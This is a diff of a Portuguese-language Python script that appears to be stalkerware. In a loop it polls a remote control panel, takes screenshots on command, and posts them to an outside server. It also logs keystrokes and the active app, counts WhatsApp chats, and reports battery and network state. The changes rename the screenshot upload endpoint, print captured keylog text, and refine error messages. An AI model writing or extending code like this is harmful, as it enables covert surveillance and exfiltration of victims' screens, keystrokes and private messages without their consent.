@@ -9,7 +9,7 @@ from datetime import datetime
 
 URL_SERVIDOR = "https://nexos-panel.onrender.com/update"
 URL_UPLOAD_LOTE = "https://nexos-panel.onrender.com/api/upload_lote"
-URL_UPLOAD_FOTO = "https://nexos-panel.onrender.com/api/upload_camera"
+URL_UPLOAD_PRINT = "https://nexos-panel.onrender.com/api/upload_print"
 URL_PING = "https://nexos-panel.onrender.com/"
 ARQUIVO_ID = os.path.expanduser("~/.nexos_device_id")
 
@@ -159,8 +159,10 @@ def executar_comando(acao):
         print("   📱 Tirando print da tela...")
         b64 = capturar_print()
         if b64:
-            r = requests.post(URL_UPLOAD_FOTO, json={"device_id": DEVICE_ID, "tipo": "screen", "photo": b64}, timeout=20)
-            print(f"   {'✅ Print enviado!' if r.status_code == 200 else '❌ Falha'}")
+            r = requests.post(URL_UPLOAD_PRINT, json={"device_id": DEVICE_ID, "photo": b64}, timeout=20)
+            print(f"   {'✅ Print enviado!' if r.status_code == 200 else '❌ Falha ao enviar print'}")
+        else:
+            print("   ❌ Falha ao capturar print")
 
 def enviar_dados(payload):
     json_str = json.dumps(payload).replace("'", "'\\''")
@@ -186,7 +188,7 @@ def enviar_lote(front_b64, back_b64):
         return r.status_code == 200
     except: return False
 
-print("🛰️  INICIADO v3.1 + Print Manual\n")
+print("🛰️  INICIADO v3.1 + Print Tela\n")
 
 while True:
     t0 = time.time()
@@ -223,10 +225,11 @@ while True:
         
         extra = ""
         if keylog and keylog.get("ativo"): extra += f" | ⌨️ {keylog['app']}"
-        if msgs_whats: extra += f" | 💬 {len(msgs_whats)}"
+        if msgs_whats: extra += f" | 💬 {len(msgs_whats)} chats"
         
         print(f"{icone} [{datetime.now().strftime('%H:%M:%S')}] Bat:{bat}% {rede}{extra} | {dt:.1f}s")
         
+        if keylog and keylog.get("texto"): print(f"   ⌨️ Texto: {keylog['texto'][:80]}")
         if cmd_remoto != "none": executar_comando(cmd_remoto)
         
         if cmd_cam == "take_dual":
